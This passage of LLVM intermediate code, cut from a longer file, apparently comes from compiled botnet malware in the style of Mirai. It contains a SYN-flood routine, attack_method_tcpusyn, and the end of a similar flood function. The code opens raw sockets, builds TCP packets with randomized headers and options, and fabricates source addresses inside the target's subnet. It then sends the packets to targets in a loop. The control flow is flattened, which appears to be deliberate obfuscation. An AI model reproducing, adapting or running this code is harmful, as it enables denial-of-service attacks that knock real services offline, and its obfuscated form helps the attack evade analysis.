  store i32 -1740257863, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i16, i16* %13, align 2
  %351 = zext i16 %350 to i32
  %352 = icmp eq i32 %351, 65535
  %353 = select i1 %352, i32 -1487345175, i32 1676267580
  store i32 %353, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  %355 = call i32 @rand_next()
  %356 = and i32 %355, 65535
  %357 = trunc i32 %356 to i16
  %358 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i32 0, i32 3
  store i16 %357, i16* %359, align 4
  store i32 1676267580, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  %361 = load i16, i16* %16, align 2
  %362 = zext i16 %361 to i32
  %363 = icmp eq i32 %362, 65535
  %364 = select i1 %363, i32 1636775838, i32 951709869
  store i32 %364, i32* %switchVar
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  %366 = call i32 @rand_next()
  %367 = and i32 %366, 65535
  %368 = trunc i32 %367 to i16
  %369 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %370 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %369, i32 0, i32 0
  store i16 %368, i16* %370, align 4
  store i32 951709869, i32* %switchVar
  br label %loopEnd

; <label>:371:                                    ; preds = %loopEntry
  %372 = load i16, i16* %17, align 2
  %373 = zext i16 %372 to i32
  %374 = icmp eq i32 %373, 65535
  %375 = select i1 %374, i32 1286601770, i32 -1472267692
  store i32 %375, i32* %switchVar
  br label %loopEnd

; <label>:376:                                    ; preds = %loopEntry
  %377 = call i32 @rand_next()
  %378 = and i32 %377, 65535
  %379 = trunc i32 %378 to i16
  %380 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %381 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %380, i32 0, i32 1
  store i16 %379, i16* %381, align 2
  store i32 -1472267692, i32* %switchVar
  br label %loopEnd

; <label>:382:                                    ; preds = %loopEntry
  %383 = load i32, i32* %18, align 4
  %384 = icmp eq i32 %383, 65535
  %385 = select i1 %384, i32 682546248, i32 -83745962
  store i32 %385, i32* %switchVar
  br label %loopEnd

; <label>:386:                                    ; preds = %loopEntry
  %387 = call i32 @rand_next()
  %388 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %389 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %388, i32 0, i32 2
  store i32 %387, i32* %389, align 4
  store i32 -83745962, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i32, i32* %19, align 4
  %392 = icmp eq i32 %391, 65535
  %393 = select i1 %392, i32 1163993203, i32 1144676156
  store i32 %393, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = call i32 @rand_next()
  %396 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %397 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %396, i32 0, i32 3
  store i32 %395, i32* %397, align 4
  store i32 1144676156, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  %399 = load i8, i8* %20, align 1
  %400 = icmp ne i8 %399, 0
  %401 = select i1 %400, i32 1473234629, i32 864270942
  store i32 %401, i32* %switchVar
  br label %loopEnd

; <label>:402:                                    ; preds = %loopEntry
  %403 = call i32 @rand_next()
  %404 = and i32 %403, 65535
  %405 = trunc i32 %404 to i16
  %406 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 7
  store i16 %405, i16* %407, align 2
  store i32 864270942, i32* %switchVar
  br label %loopEnd

; <label>:408:                                    ; preds = %loopEntry
  %409 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 7
  store i16 0, i16* %410, align 2
  %411 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %412 = bitcast %struct.iphdr* %411 to i16*
  %413 = call zeroext i16 @checksum_generic(i16* %412, i32 20)
  %414 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 7
  store i16 %413, i16* %415, align 2
  %416 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %417 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %416, i32 0, i32 6
  store i16 0, i16* %417, align 4
  %418 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %419 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %420 = bitcast %struct.tcphdr* %419 to i8*
  %421 = call zeroext i16 @htons(i16 zeroext 40) #7
  %422 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %418, i8* %420, i16 zeroext %421, i32 40)
  %423 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %424 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %423, i32 0, i32 6
  store i16 %422, i16* %424, align 4
  %425 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %426 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %425, i32 0, i32 1
  %427 = load i16, i16* %426, align 2
  %428 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %429 = load i32, i32* %9, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %428, i64 %430
  %432 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %431, i32 0, i32 0
  %433 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %432, i32 0, i32 1
  store i16 %427, i16* %433, align 2
  %434 = load i32, i32* %10, align 4
  %435 = load i8*, i8** %30, align 8
  %436 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %437 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %438 = load i32, i32* %9, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %437, i64 %439
  %441 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %440, i32 0, i32 0
  %442 = bitcast %struct.sockaddr_in* %441 to %struct.sockaddr*
  store %struct.sockaddr* %442, %struct.sockaddr** %436, align 8
  %443 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %444 = load %struct.sockaddr*, %struct.sockaddr** %443, align 8
  %445 = call i64 @sendto(i32 %434, i8* %435, i64 60, i32 16384, %struct.sockaddr* %444, i32 16)
  store i32 -1749921190, i32* %switchVar
  br label %loopEnd

; <label>:446:                                    ; preds = %loopEntry
  %447 = load i32, i32* %9, align 4
  %448 = add nsw i32 %447, 1
  store i32 %448, i32* %9, align 4
  store i32 526682558, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  store i32 813740471, i32* %switchVar
  br label %loopEnd

; <label>:450:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %449, %446, %408, %402, %398, %394, %390, %386, %382, %376, %371, %365, %360, %354, %349, %345, %341, %320, %300, %294, %293, %292, %289, %164, %160, %116, %110, %109, %106, %100, %99, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpusyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 1)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %10, align 4
  %switchVar = alloca i32
  store i32 1019313275, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1019313275, label %first
    i32 308075171, label %99
    i32 -473926490, label %100
    i32 -486398942, label %106
    i32 -1294852743, label %109
    i32 -768923580, label %110
    i32 1702679643, label %116
    i32 1936353917, label %160
    i32 174676545, label %164
    i32 1019007361, label %289
    i32 1862187171, label %292
    i32 -1298656835, label %293
    i32 -692316888, label %294
    i32 410151657, label %300
    i32 235035585, label %320
    i32 1899644497, label %341
    i32 -1361195060, label %345
    i32 -1377994184, label %349
    i32 1905100515, label %354
    i32 -822080514, label %360
    i32 -1288783676, label %365
    i32 16261829, label %371
    i32 1645859560, label %376
    i32 1520353685, label %382
    i32 -1449095219, label %386
    i32 509762412, label %390
    i32 -1067120953, label %394
    i32 -1824033894, label %398
    i32 -814721806, label %402
    i32 424649264, label %408
    i32 595019086, label %446
    i32 -424980965, label %449
    i32 -214408790, label %450
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %97 = icmp eq i32 %.reload, -1
  %98 = select i1 %97, i32 308075171, i32 -473926490
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  store i32 -214408790, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %101 = load i32, i32* %10, align 4
  %102 = bitcast i32* %9 to i8*
  %103 = call i32 @setsockopt(i32 %101, i32 0, i32 3, i8* %102, i32 4) #6
  %104 = icmp eq i32 %103, -1
  %105 = select i1 %104, i32 -486398942, i32 -1294852743
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %10, align 4
  %108 = call i32 @close(i32 %107)
  store i32 -214408790, i32* %switchVar
  br label %loopEnd

; <label>:109:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -768923580, i32* %switchVar
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %111 = load i32, i32* %9, align 4
  %112 = load i8, i8* %5, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp slt i32 %111, %113
  %115 = select i1 %114, i32 1702679643, i32 1862187171
  store i32 %115, i32* %switchVar
  br label %loopEnd

; <label>:116:                                    ; preds = %loopEntry
  %117 = call noalias i8* @calloc(i64 128, i64 1) #6
  %118 = load i8**, i8*** %11, align 8
  %119 = load i32, i32* %9, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8*, i8** %118, i64 %120
  store i8* %117, i8** %121, align 8
  %122 = load i8**, i8*** %11, align 8
  %123 = load i32, i32* %9, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds i8*, i8** %122, i64 %124
  %126 = load i8*, i8** %125, align 8
  %127 = bitcast i8* %126 to %struct.iphdr*
  store %struct.iphdr* %127, %struct.iphdr** %27, align 8
  %128 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i64 1
  %130 = bitcast %struct.iphdr* %129 to %struct.tcphdr*
  store %struct.tcphdr* %130, %struct.tcphdr** %28, align 8
  %131 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %132 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %131, i64 1
  %133 = bitcast %struct.tcphdr* %132 to i8*
  store i8* %133, i8** %29, align 8
  %134 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %135 = bitcast %struct.iphdr* %134 to i8*
  %136 = load i8, i8* %135, align 4
  %137 = and i8 %136, 15
  %138 = or i8 %137, 64
  store i8 %138, i8* %135, align 4
  %139 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %140 = bitcast %struct.iphdr* %139 to i8*
  %141 = load i8, i8* %140, align 4
  %142 = and i8 %141, -16
  %143 = or i8 %142, 5
  store i8 %143, i8* %140, align 4
  %144 = load i8, i8* %12, align 1
  %145 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %146 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %145, i32 0, i32 1
  store i8 %144, i8* %146, align 1
  %147 = call zeroext i16 @htons(i16 zeroext 60) #7
  %148 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 2
  store i16 %147, i16* %149, align 2
  %150 = load i16, i16* %13, align 2
  %151 = call zeroext i16 @htons(i16 zeroext %150) #7
  %152 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 3
  store i16 %151, i16* %153, align 4
  %154 = load i8, i8* %14, align 1
  %155 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 5
  store i8 %154, i8* %156, align 4
  %157 = load i8, i8* %15, align 1
  %158 = icmp ne i8 %157, 0
  %159 = select i1 %158, i32 1936353917, i32 174676545
  store i32 %159, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  %161 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %162 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 4
  store i16 %161, i16* %163, align 2
  store i32 174676545, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  %165 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 6
  store i8 6, i8* %166, align 1
  %167 = load i32, i32* %26, align 4
  %168 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 8
  store i32 %167, i32* %169, align 4
  %170 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %171 = load i32, i32* %9, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i64 %172
  %174 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i32 0, i32 1
  %175 = load i32, i32* %174, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 9
  store i32 %175, i32* %177, align 4
  %178 = load i16, i16* %16, align 2
  %179 = call zeroext i16 @htons(i16 zeroext %178) #7
  %180 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %181 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %180, i32 0, i32 0
  store i16 %179, i16* %181, align 4
  %182 = load i16, i16* %17, align 2
  %183 = call zeroext i16 @htons(i16 zeroext %182) #7
  %184 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %185 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %184, i32 0, i32 1
  store i16 %183, i16* %185, align 2
  %186 = load i32, i32* %18, align 4
  %187 = trunc i32 %186 to i16
  %188 = call zeroext i16 @htons(i16 zeroext %187) #7
  %189 = zext i16 %188 to i32
  %190 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 2
  store i32 %189, i32* %191, align 4
  %192 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 4
  %194 = load i16, i16* %193, align 4
  %195 = and i16 %194, -241
  %196 = or i16 %195, 160
  store i16 %196, i16* %193, align 4
  %197 = load i8, i8* %20, align 1
  %198 = sext i8 %197 to i16
  %199 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %200 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %199, i32 0, i32 4
  %201 = load i16, i16* %200, align 4
  %202 = and i16 %198, 1
  %203 = shl i16 %202, 13
  %204 = and i16 %201, -8193
  %205 = or i16 %204, %203
  store i16 %205, i16* %200, align 4
  %206 = load i8, i8* %21, align 1
  %207 = sext i8 %206 to i16
  %208 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 4
  %210 = load i16, i16* %209, align 4
  %211 = and i16 %207, 1
  %212 = shl i16 %211, 12
  %213 = and i16 %210, -4097
  %214 = or i16 %213, %212
  store i16 %214, i16* %209, align 4
  %215 = load i8, i8* %22, align 1
  %216 = sext i8 %215 to i16
  %217 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %218 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %217, i32 0, i32 4
  %219 = load i16, i16* %218, align 4
  %220 = and i16 %216, 1
  %221 = shl i16 %220, 11
  %222 = and i16 %219, -2049
  %223 = or i16 %222, %221
  store i16 %223, i16* %218, align 4
  %224 = load i8, i8* %23, align 1
  %225 = sext i8 %224 to i16
  %226 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 4
  %228 = load i16, i16* %227, align 4
  %229 = and i16 %225, 1
  %230 = shl i16 %229, 10
  %231 = and i16 %228, -1025
  %232 = or i16 %231, %230
  store i16 %232, i16* %227, align 4
  %233 = load i8, i8* %24, align 1
  %234 = sext i8 %233 to i16
  %235 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %236 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %235, i32 0, i32 4
  %237 = load i16, i16* %236, align 4
  %238 = and i16 %234, 1
  %239 = shl i16 %238, 9
  %240 = and i16 %237, -513
  %241 = or i16 %240, %239
  store i16 %241, i16* %236, align 4
  %242 = load i8, i8* %25, align 1
  %243 = sext i8 %242 to i16
  %244 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %245 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %244, i32 0, i32 4
  %246 = load i16, i16* %245, align 4
  %247 = and i16 %243, 1
  %248 = shl i16 %247, 8
  %249 = and i16 %246, -257
  %250 = or i16 %249, %248
  store i16 %250, i16* %245, align 4
  %251 = load i8*, i8** %29, align 8
  %252 = getelementptr inbounds i8, i8* %251, i32 1
  store i8* %252, i8** %29, align 8
  store i8 2, i8* %251, align 1
  %253 = load i8*, i8** %29, align 8
  %254 = getelementptr inbounds i8, i8* %253, i32 1
  store i8* %254, i8** %29, align 8
  store i8 4, i8* %253, align 1
  %255 = call i32 @rand_next()
  %256 = and i32 %255, 15
  %257 = add i32 1400, %256
  %258 = trunc i32 %257 to i16
  %259 = call zeroext i16 @htons(i16 zeroext %258) #7
  %260 = load i8*, i8** %29, align 8
  %261 = bitcast i8* %260 to i16*
  store i16 %259, i16* %261, align 2
  %262 = load i8*, i8** %29, align 8
  %263 = getelementptr inbounds i8, i8* %262, i64 2
  store i8* %263, i8** %29, align 8
  %264 = load i8*, i8** %29, align 8
  %265 = getelementptr inbounds i8, i8* %264, i32 1
  store i8* %265, i8** %29, align 8
  store i8 4, i8* %264, align 1
  %266 = load i8*, i8** %29, align 8
  %267 = getelementptr inbounds i8, i8* %266, i32 1
  store i8* %267, i8** %29, align 8
  store i8 2, i8* %266, align 1
  %268 = load i8*, i8** %29, align 8
  %269 = getelementptr inbounds i8, i8* %268, i32 1
  store i8* %269, i8** %29, align 8
  store i8 8, i8* %268, align 1
  %270 = load i8*, i8** %29, align 8
  %271 = getelementptr inbounds i8, i8* %270, i32 1
  store i8* %271, i8** %29, align 8
  store i8 10, i8* %270, align 1
  %272 = call i32 @rand_next()
  %273 = load i8*, i8** %29, align 8
  %274 = bitcast i8* %273 to i32*
  store i32 %272, i32* %274, align 4
  %275 = load i8*, i8** %29, align 8
  %276 = getelementptr inbounds i8, i8* %275, i64 4
  store i8* %276, i8** %29, align 8
  %277 = load i8*, i8** %29, align 8
  %278 = bitcast i8* %277 to i32*
  store i32 0, i32* %278, align 4
  %279 = load i8*, i8** %29, align 8
  %280 = getelementptr inbounds i8, i8* %279, i64 4
  store i8* %280, i8** %29, align 8
  %281 = load i8*, i8** %29, align 8
  %282 = getelementptr inbounds i8, i8* %281, i32 1
  store i8* %282, i8** %29, align 8
  store i8 1, i8* %281, align 1
  %283 = load i8*, i8** %29, align 8
  %284 = getelementptr inbounds i8, i8* %283, i32 1
  store i8* %284, i8** %29, align 8
  store i8 3, i8* %283, align 1
  %285 = load i8*, i8** %29, align 8
  %286 = getelementptr inbounds i8, i8* %285, i32 1
  store i8* %286, i8** %29, align 8
  store i8 3, i8* %285, align 1
  %287 = load i8*, i8** %29, align 8
  %288 = getelementptr inbounds i8, i8* %287, i32 1
  store i8* %288, i8** %29, align 8
  store i8 6, i8* %287, align 1
  store i32 1019007361, i32* %switchVar
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = load i32, i32* %9, align 4
  %291 = add nsw i32 %290, 1
  store i32 %291, i32* %9, align 4
  store i32 -768923580, i32* %switchVar
  br label %loopEnd

; <label>:292:                                    ; preds = %loopEntry
  store i32 -1298656835, i32* %switchVar
  br label %loopEnd

; <label>:293:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -692316888, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i32, i32* %9, align 4
  %296 = load i8, i8* %5, align 1
  %297 = zext i8 %296 to i32
  %298 = icmp slt i32 %295, %297
  %299 = select i1 %298, i32 410151657, i32 -424980965
  store i32 %299, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  %301 = load i8**, i8*** %11, align 8
  %302 = load i32, i32* %9, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8*, i8** %301, i64 %303
  %305 = load i8*, i8** %304, align 8
  store i8* %305, i8** %30, align 8
  %306 = load i8*, i8** %30, align 8
  %307 = bitcast i8* %306 to %struct.iphdr*
  store %struct.iphdr* %307, %struct.iphdr** %31, align 8
  %308 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %309 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %308, i64 1
  %310 = bitcast %struct.iphdr* %309 to %struct.tcphdr*
  store %struct.tcphdr* %310, %struct.tcphdr** %32, align 8
  %311 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i32 0, i32 2
  %316 = load i8, i8* %315, align 4
  %317 = zext i8 %316 to i32
  %318 = icmp slt i32 %317, 32
  %319 = select i1 %318, i32 235035585, i32 1899644497
  store i32 %319, i32* %switchVar
  br label %loopEnd

; <label>:320:                                    ; preds = %loopEntry
  %321 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %322 = load i32, i32* %9, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %321, i64 %323
  %325 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %324, i32 0, i32 1
  %326 = load i32, i32* %325, align 4
  %327 = call i32 @ntohl(i32 %326) #7
  %328 = call i32 @rand_next()
  %329 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %332, i32 0, i32 2
  %334 = load i8, i8* %333, align 4
  %335 = zext i8 %334 to i32
  %336 = lshr i32 %328, %335
  %337 = add i32 %327, %336
  %338 = call i32 @htonl(i32 %337) #7
  %339 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 9
  store i32 %338, i32* %340, align 4
  store i32 1899644497, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = load i32, i32* %26, align 4
